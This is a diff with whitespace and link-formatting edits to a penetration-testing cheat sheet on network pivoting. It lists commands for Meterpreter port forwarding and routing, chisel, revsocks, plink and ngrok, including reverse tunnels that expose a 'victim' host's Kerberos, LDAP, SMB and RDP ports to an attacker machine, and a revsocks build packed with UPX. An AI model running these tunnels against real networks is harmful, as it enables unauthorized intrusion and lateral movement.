@@ -122,41 +122,41 @@ optional arguments:
 
 ```powershell
 # Meterpreter list active port forwards
-portfwd list 
+portfwd list
 
 # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
-portfwd add –l 3389 –p 3389 –r target-host 
+portfwd add –l 3389 –p 3389 –r target-host
 portfwd add -l 88 -p 88 -r 127.0.0.1
 portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
 
 # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell
-portfwd delete –l 3389 –p 3389 –r target-host 
+portfwd delete –l 3389 –p 3389 –r target-host
 # Meterpreter delete all port forwards
-portfwd flush 
+portfwd flush
 
 or
 
 # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0
-run autoroute -s 192.168.15.0/24 
+run autoroute -s 192.168.15.0/24
 use auxiliary/server/socks4a
 
 # Meterpreter list all active routes
-run autoroute -p 
+run autoroute -p
 
 route #Meterpreter view available networks the compromised host can access
 # Meterpreter add route for 192.168.14.0/24 via Session number.
-route add 192.168.14.0 255.255.255.0 3 
+route add 192.168.14.0 255.255.255.0 3
 # Meterpreter delete route for 192.168.14.0/24 via Session number.
-route delete 192.168.14.0 255.255.255.0 3 
+route delete 192.168.14.0 255.255.255.0 3
 # Meterpreter delete all routes
-route flush 
+route flush
 ```
 
 ## sshuttle
 
-Transparent proxy server that works as a poor man's VPN. Forwards over ssh. 
+Transparent proxy server that works as a poor man's VPN. Forwards over ssh.
 
-* Doesn't require admin. 
+* Doesn't require admin.
 * Works with Linux and MacOS.
 * Supports DNS tunneling.
 
@@ -164,10 +164,10 @@ Transparent proxy server that works as a poor man's VPN. Forwards over ssh.
 pacman -Sy sshuttle
 apt-get install sshuttle
 sshuttle -vvr user@10.10.10.10 10.1.1.0/24
-sshuttle -vvr username@pivot_host 10.2.2.0/24 
+sshuttle -vvr username@pivot_host 10.2.2.0/24
 
 # using a private key
-$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 
+$ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
 
 # -x == exclude some network to not transmit over the tunnel
 # -x x.x.x.x.x/24
@@ -175,23 +175,22 @@ $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
 
 ## chisel
 
-
 ```powershell
 go get -v github.com/jpillora/chisel
 
 # forward port 389 and 88 to hacker computer
-user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389
 user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
 ```
 
 ### SharpChisel
 
-A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel
+A C# Wrapper of Chisel : <https://github.com/shantanu561993/SharpChisel>
 
 ```powershell
 user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
 ================================================================
-server : run the Server Component of chisel 
+server : run the Server Component of chisel
 -p 8080 : run server on port 8080
 --key "private": use "private" string to seed the generation of a ECDSA public and private key pair
 --auth "user:pass" : Creds required to connect to the server
@@ -203,7 +202,7 @@ user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront
 
 ## Gost
 
-> Wiki English : https://docs.ginuerzh.xyz/gost/en/
+> Wiki English : <https://docs.ginuerzh.xyz/gost/en/>
 
 ```powershell
 git clone https://github.com/ginuerzh/gost
@@ -258,7 +257,6 @@ user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
 ```
 
-
 ```powershell
 # Build for Linux
 git clone https://github.com/kost/revsocks
@@ -278,12 +276,11 @@ go build -ldflags -H=windowsgui
 upx revsocks
 ```
 
-
 ## plink
 
 ```powershell
 # exposes the SMB port of the machine in the port 445 of the SSH Server
-plink -l root -pw toor -R 445:127.0.0.1:445 
+plink -l root -pw toor -R 445:127.0.0.1:445
 # exposes the RDP port of the machine in the port 3390 of the SSH Server
 plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  
 
@@ -292,7 +289,7 @@ plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445
 
 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
 # redirects the Windows port 445 to Kali on port 22
-plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   
+plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
 ```
 
 ## ngrok
@@ -300,7 +297,7 @@ plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
 ```powershell
 # get the binary
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-unzip ngrok-stable-linux-amd64.zip 
+unzip ngrok-stable-linux-amd64.zip
 
 # log into the service
 ./ngrok authtoken 3U[REDACTED_TOKEN]Hm
@@ -309,7 +306,6 @@ unzip ngrok-stable-linux-amd64.zip
 ./ngrok http 4433
 ./ngrok tcp 4433
 ```
-
 
 ## Basic Pivoting Types
 
